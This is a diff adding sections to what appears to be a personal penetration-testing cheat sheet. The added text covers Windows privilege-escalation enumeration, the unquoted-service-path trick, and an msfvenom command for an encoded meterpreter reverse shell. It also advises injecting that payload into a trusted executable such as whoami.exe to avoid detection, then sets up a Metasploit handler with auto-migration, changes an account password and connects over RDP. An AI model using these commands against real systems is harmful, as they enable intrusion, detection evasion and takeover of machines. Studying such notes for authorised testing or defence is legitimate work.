@@ -829,6 +829,9 @@ Will create a reverse shell with a php shell and cleanup on its own. Need Wordpr
 
     use exploit/unix/webapp/wp_admin_shell_upload
     
+*Find the Kernel version*
+
+    uname -a -> on the local maschine
 
 *Linuxprivchecker*
 
@@ -856,6 +859,49 @@ Go back to meterpreter
     shell 
     python -c 'import pty; pty.spawn("/bin/bash")'
     su root
+
+**Windows Enumeration**
+
+*Check vulnerable services*
+
+List all the running services on the maschine that are automatically started and non standard.
+
+    wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows" |findstr /i /v "\""
+    wmic - gives a list of all running services
+    /i - makes the search case insensitive
+    /v ignores anything that contains the given String
+
+Possible finding  C:\Program Files\... --> can be used by putting a file with name Files.exe under C:\Program
+
+*check dir permissions*
+
+    icacls "path"
+
+*check user permissions*
+
+    whoami /priv
+
+*Generate Payload*
+
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<url> LPORT=<port> -e x86/shikata_ga_nai -i 7 -f raw > shell.bin
+    -i - means the iterations shikata ga nai will execute on the payload
+
+Inject the payload in a trustworthy exe like whoami.exe with the help of shellter
+
+*Msfconsole meterpreter*
+
+    msfconsole -q -x "use exploit/multi/handler;\
+    set PAYLOAD windows/meterpreter/reverse_tcp;\
+    <span custom-style="BoldCodeRed">set AutoRunScript post/windows/manage/migrate;\
+    set LHOST <ip>;\
+    set LPORT <port>;\
+    run"</span>
+
+This will start a session handler and wait for incomming reverse shell requests. Then directly automigrate the process to a new process. 
+
+*Set password for windows account*
+
+    net user <accountname> <password>
 
 **Post Exploitation**
 
@@ -1021,6 +1067,12 @@ The malicious plugin is called "plugin-shell.php"
     mysql --host=<ip> --port=<port> --user= <user> -p 
     ip - would be 127.0.0.1 in case of port forwarding
     port - the port where the portforward is running at
+
+RDP
+
+xfreerdp is preinstalled
+
+    xfreerdp /d:<domain> /u:<user> /v:<target_ip> +clipboard
 
 **Additional**
 
